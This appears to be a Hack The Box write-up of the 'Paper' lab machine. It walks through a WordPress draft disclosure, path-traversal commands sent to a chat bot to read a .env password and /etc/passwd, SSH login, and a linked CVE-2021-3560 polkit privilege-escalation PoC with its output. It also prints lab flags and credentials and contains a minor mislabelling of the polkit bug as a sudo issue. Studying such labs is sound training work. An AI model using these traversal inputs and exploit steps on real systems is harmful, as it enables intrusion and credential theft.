---
title: "Paper from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Paper from HTB
`nmap`gave this
```bash
PORT      STATE    SERVICE   VERSION
22/tcp    open     ssh       OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
24/tcp    filtered priv-mail
80/tcp    open     http      Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-title: HTTP Server Test Page powered by CentOS
443/tcp   open     ssl/http  Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-title: HTTP Server Test Page powered by CentOS
| tls-alpn:
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
| http-methods:
|_  Potentially risky methods: TRACE
```
Access the site and at the bottom we find that site runs on `wordpress`and with `wpscan`we find that `version is 5.2.3`
which is exploitable. you just need to add `/?static=1`which will show you all things without `logging in`.
I got this text
```
test

Micheal please remove the secret from drafts for gods sake!

Hello employees of Blunder Tiffin,

Due to the orders from higher officials, every employee who were added to this blog is removed and they are migrated to our new chat system.

So, I kindly request you all to take your discussions from the public blog to a more private chat system.

-Nick

# Warning for Michael

Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick

Threat Level Midnight

A MOTION PICTURE SCREENPLAY,
WRITTEN AND DIRECTED BY
MICHAEL SCOTT

[INT:DAY]

Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt….

# Secret Registration URL of new Employee chat system

http://chat.office.paper/register/8qozr226AhkCHZdyY

# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.

# Also, stop looking at my drafts. Jeez!
```
Here we see subdomain so lets add it to `/etc/hosts`
```
10.10.11.143 chat.office.paper
```
Access that subdomain. It is an `login page`, but with this link we can create new user
```
# Secret Registration URL of new Employee chat system

http://chat.office.paper/register/8qozr226AhkCHZdyY
```
Use that link and create new user. After logging in you will see `general chat`where is added `bot --- recyclops`you can't write in that channel so send direct message to him.
```
- recyclops help

-------------
-------------------
----------------------
- 3. Files:

- eg: 'recyclops get me the file test.txt', or 'recyclops could you send me the file sale/secret.xls' or just 'recyclops file test.txt'


- 4. List:

- You can ask me to list the files

- eg: 'recyclops i need directory list sale' or just 'recyclops list sale'
```
This is needed.
```
- list

- Fetching the directory listing of /sales/

- total 0
    drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 .
    drwx------ 11 dwight dwight 281 Feb 6 2022 ..
    drwxr-xr-x 2 dwight dwight 27 Sep 15 2021 sale
    drwxr-xr-x 2 dwight dwight 27 Jul 3 2021 sale_2
```
Nothing is in this directories. `bot says that he can only list and read in that directory but doesn't say he can't read in other directory from there`
```bash
- list ..

    Fetching the directory listing of ..

- total 32
    drwx------ 11 dwight dwight 281 Feb 6 2022 .
    drwxr-xr-x. 3 root root 20 Jan 14 2022 ..
    lrwxrwxrwx 1 dwight dwight 9 Jul 3 2021 .bash_history -> /dev/null
    -rw-r--r-- 1 dwight dwight 18 May 10 2019 .bash_logout
    -rw-r--r-- 1 dwight dwight 141 May 10 2019 .bash_profile
    -rw-r--r-- 1 dwight dwight 358 Jul 3 2021 .bashrc
    -rwxr-xr-x 1 dwight dwight 1174 Sep 16 2021 bot_[restart.sh](http://restart.sh/)
    drwx------ 5 dwight dwight 56 Jul 3 2021 .config
    -rw------- 1 dwight dwight 16 Jul 3 2021 .esd_auth
    drwx------ 2 dwight dwight 44 Jul 3 2021 .gnupg
    drwx------ 8 dwight dwight 4096 Sep 16 2021 hubot
    -rw-rw-r-- 1 dwight dwight 18 Sep 16 2021 .hubot_history
    drwx------ 3 dwight dwight 19 Jul 3 2021 .local
    drwxr-xr-x 4 dwight dwight 39 Jul 3 2021 .mozilla
    drwxrwxr-x 5 dwight dwight 83 Jul 3 2021 .npm
    drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 sales
    drwx------ 2 dwight dwight 6 Sep 16 2021 .ssh
    -r-------- 1 dwight dwight 33 Aug 18 09:00 user.txt
    drwxr-xr-x 2 dwight dwight 24 Sep 16 2021 .vim
```
there is an `hubot`which if we search stores `password`in `/hubot/.env` So let's read it.
```bash
file ../hubot/.env


- <!=====Contents of file ../hubot/.env=====>

- export ROCKETCHAT_URL='[http://127.0.0.1:48320](http://127.0.0.1:48320/)'
    export ROCKETCHAT_USER=recyclops
    export ROCKETCHAT_PASSWORD=Queenofblad3s!23
    export ROCKETCHAT_USESSL=false
    export RESPOND_TO_DM=true
    export RESPOND_TO_EDITED=true
    export PORT=8000
    export BIND_ADDRESS=127.0.0.1

- <!=====End of file ../hubot/.env=====>
```
We have the password. Now let's read `/etc/passwd`so we know which user has this password
```bash
file ../../../etc/passwd


rocketchat❌1001:1001::/home/rocketchat:/bin/bash
dwight❌1004:1004::/home/dwight:/bin/bash
```
After trying to log in as `rocketchat`i can't so its `dwight`we will use
>Username
>   dwight
> Password
>   Queenofblad3s!23

```bash
ssh dwight@10.10.11.143
password:
```
***
User Flag is: 8c4b2e8917b943aa84d10221fa78bd5f
***
Then download `linpeas.sh`on that machine and run it.
With that we learn that `sudo version --- 1.8.29`which is exploitable
https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/blob/main/poc.sh
This is the code we will use.
I set the
> Username
>   shavigio
> Password
>   shavigio

and ran this code many times until you get something like this:
```bash
[dwight@paper ~]$ ./polkit_privilege_escalation.sh

[!] Username set as : shavigio
[!] No Custom Timing specified.
[!] Timing will be detected Automatically
[!] Force flag not set.
[!] Vulnerability checking is ENABLED!
[!] Starting Vulnerability Checks...
[!] Checking distribution...
[!] Detected Linux distribution as "centos"
[!] Checking if Accountsservice and Gnome-Control-Center is installed
[+] Accounts service and Gnome-Control-Center Installation Found!!
[!] Checking if polkit version is vulnerable
[+] Polkit version appears to be vulnerable!!
[!] Starting exploit...
[!] Inserting Username shavigio...
Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
[+] Inserted Username shavigio  with UID 1005!
[!] Inserting password hash...
[!] It looks like the password insertion was succesful!
[!] Try to login as the injected user using su - shavigio
[!] When prompted for password, enter your password
[!] If the username is inserted, but the login fails; try running the exploit again.
[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell
```
`Without any errors`
Then switch user like this
```bash
su - shavigio
password:

[shavigio@paper ~]$ sudo bash

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for shavigio:
[root@paper shavigio]#
```
***
Root Flag is: 5c684c62005aaba6f5d271c1b525f546
***
![](/assets/images/Screenshot from 2024-08-19 13-38-14.png)
